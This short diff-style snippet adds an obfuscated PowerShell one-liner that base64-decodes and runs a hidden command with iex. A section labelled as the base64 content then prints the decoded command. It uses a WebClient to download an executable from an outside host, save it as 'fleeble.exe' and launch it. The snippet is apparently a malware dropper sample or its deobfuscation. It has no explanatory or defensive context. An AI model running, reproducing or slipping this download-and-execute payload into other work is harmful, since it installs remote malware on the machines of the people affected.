@@ -1,0 +1,7 @@
+iex([sysTeM.tEXT.eNcoDING]::utF8.GETStRING([SYSTeM.ConvErt]::froMBASe64StrInG('CihOZXctT2JqZWN0IFN5c1RlTS5ORVQuV0ViQ0xJZW50KS5kT3dubG9hZGZpbGUoJ2h0dHA6Ly9tYXRrYWx2LjVnYmZyZWUuY29tL25vemEvb2RlZWUuZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SysTeM.NET.WEbCLIent).dOwnloadfile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
